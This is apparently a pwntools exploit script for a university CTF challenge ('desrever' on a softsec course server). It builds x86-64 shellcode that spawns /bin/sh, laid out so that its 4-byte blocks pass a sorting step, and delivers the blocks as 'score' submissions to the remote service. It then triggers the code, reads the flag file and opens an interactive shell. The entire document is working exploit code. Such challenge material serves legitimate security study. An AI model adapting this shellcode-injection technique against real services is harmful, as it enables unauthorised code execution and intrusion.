#!/usr/bin/env python3

import pwn

exe = pwn.ELF("./vuln")
libc = pwn.ELF("./libc.so.6")
#ld = pwn.ELF("./ld-linux-x86-64.so.2")

pwn.context.arch = 'amd64'

# 1) docker compose -f debug.yml up
# 2) docker exec -ti $(docker ps --quiet --filter 'ancestor=softsec/desrever') /bin/bash
# 3) gdb -p "$(pgrep -n vuln)"

conn = pwn.remote('tasks.ws24.softsec.rub.de', 33749)
#conn = pwn.remote('127.0.0.1', 1024)

conn.recvuntil(b').\n')

# we can write shellcode inside the memory region and that code will be executed
# problem: 4 Byte blocks are sorted, so we need to create shellcode that is ascending 4-Byte wise
shellcode = pwn.asm("""
    nop;
    nop;
    mov rbx, 0x68732f6e69622f00;
   
    ror rbx, 100;
    ror rbx, 100;
                    
    xor eax, eax;         # 0x53909090
    nop;
    push rbx;   

    xor rsi, rsi;         # 0x48f63148
    mov rdi, rsp;
    xor rdx, rdx;
    nop;
    push 8;
                    
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;

                            
    syscall;              # 0x50f
    .byte 0x00, 0x00   
""")

scores = [shellcode[i:i+4] for i in range(0, len(shellcode),4)]
# 4 bytes are stored as little endien, so we need to mirror 4 byte blocks
#print(f"            I want this in memory: {[f'0x{b.hex()}' for b in scores]}")
#print(f"Therefore I need to have this int: {[hex(pwn.u32(b, endianness='little')) for b in scores]} (as int itself is then stored little endien (flipped again) and it works)")
#print(f"         As integer value this is: {[pwn.u32(b, endianness='little') for b in scores]} (needs to be decreasing)")

int_scores = [pwn.u32(b, endianness='little') for b in scores]

for pos, score in enumerate(int_scores):
    conn.sendline(b'submit')
    conn.recvuntil(b'Enter the team name: ')
    conn.sendline(str(pos).encode('ascii'))
    conn.recvuntil(b'Enter the score for the task: ')
    conn.sendline(str(score).encode('ascii'))
    conn.recvuntil(b'> ')

conn.sendline(b'magic')
conn.sendline(b'cat /flag')

conn.interactive()